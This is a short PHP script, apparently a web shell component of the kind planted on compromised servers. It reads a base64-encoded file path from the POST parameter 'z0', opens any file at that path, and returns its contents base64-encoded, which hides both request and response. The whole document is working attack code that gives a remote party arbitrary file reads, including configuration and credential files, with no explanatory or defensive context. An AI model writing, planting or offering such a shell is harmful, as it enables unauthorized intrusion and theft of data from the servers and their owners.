<?php
$szFilePath = base64_decode($_POST['z0']);
$file = fopen($szFilePath, "r") or die('ERROR://Unable to open file!');
echo(base64_encode(fread($file, filesize($szFilePath))));
fclose($file);
?>